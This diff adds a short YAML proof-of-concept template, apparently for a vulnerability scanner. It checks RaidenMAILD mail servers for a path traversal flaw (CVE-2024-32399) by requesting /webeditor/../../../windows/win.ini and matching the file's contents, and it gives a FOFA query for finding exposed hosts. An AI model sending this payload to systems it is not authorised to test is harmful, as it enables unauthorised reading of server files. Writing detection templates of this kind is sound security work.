@@ -1,0 +1,17 @@
+id: poc-yaml-raidenmaild-mail-server-path-traversal
+info:
+  name: RaidenMAILD 邮件服务器 路径遍历漏洞(CVE-2024-32399)
+  severity: high
+  tags:
+  - CVE-2024-32399
+  - 路径遍历
+  finger: raidenmaild
+  fofa: body="RaidenMAILD"
+requests:
+- method: GET
+  path: /webeditor/../../../windows/win.ini
+  expression: "status_code == 200 && \ncontains(body,\"; for 16-bit app support\"\
+    ) &&\ncontains(body,\"[files]\") &&\ncontains(headers,\"filename=\\\"../../../windows/win.ini\\\
+    \"\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
